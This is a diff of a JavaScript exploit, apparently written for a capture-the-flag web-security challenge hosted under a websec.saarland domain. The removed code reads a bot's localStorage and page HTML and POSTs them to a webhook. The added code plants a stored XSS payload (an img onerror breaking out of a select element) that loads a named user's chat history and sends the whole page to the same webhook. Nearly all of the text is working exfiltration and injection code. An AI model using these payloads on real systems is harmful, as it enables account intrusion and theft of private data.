@@ -41,7 +41,6 @@
             }, 50);
 
             function executePayload(token) {
-                // The Master Exfiltration Payload
                 var innerJS = 
                     "document.domain='owley-madison.jeopardy.websec.saarland';" +
                     "new Image().src='" + W + "/?step=4_diary_xss';" +
@@ -50,21 +49,24 @@
                     "m.src='https://match.owley-madison.jeopardy.websec.saarland/';" +
                     "m.onload=function(){" +
                         "new Image().src='" + W + "/?step=5_match_iframe_ready';" +
-                        "try {" +
-                            // 1. Read the bot's LocalStorage (The Flag)
-                            "var favs = m.contentWindow.localStorage.getItem('favorites');" +
-                            
-                            // 2. Read the bot's HTML Session (Just in case)
-                            "var html = m.contentDocument.documentElement.innerHTML;" +
-                            
-                            // 3. POST it all to the Webhook
-                            "var x=new XMLHttpRequest();" +
-                            "x.open('POST', '" + W + "');" +
-                            "x.send('LOCAL_STORAGE: ' + favs + '\\n\\nHTML: ' + html);" +
-                            "new Image().src='" + W + "/?step=6_exfiltration_sent';" +
-                        "} catch(e) {" +
-                            "new Image().src='" + W + "/?error=' + encodeURIComponent(e.message);" +
-                        "}" +
+                        
+                        // THE CHAT HEIST TRAP
+                        // 1. Force the page to load Glillery's chat history
+                        // 2. Wait 1000ms for the AJAX request to finish loading the messages
+                        // 3. POST the entire Chat page HTML to the webhook
+                        "var trap = \"new Image().src='" + W + "/?step=7_chat_xss_fired'; " +
+                                   "load_messages('Glillery Hinton'); " +
+                                   "setTimeout(function(){ " +
+                                   "  var x=new XMLHttpRequest(); " +
+                                   "  x.open('POST', '" + W + "'); " +
+                                   "  x.send(document.body.innerHTML); " +
+                                   "}, 1000);\";" +
+                                   
+                        "var p = '</option></select><img src=x onerror=\"' + trap + '\">';" +
+                        "m.contentWindow.localStorage.setItem('favorites', JSON.stringify([p]));" +
+                        
+                        "new Image().src='" + W + "/?step=6_redirecting_to_chat';" +
+                        "window.location.href='https://chat.owley-madison.jeopardy.websec.saarland/';" +
                     "};" +
                     "document.body.appendChild(m);";
 
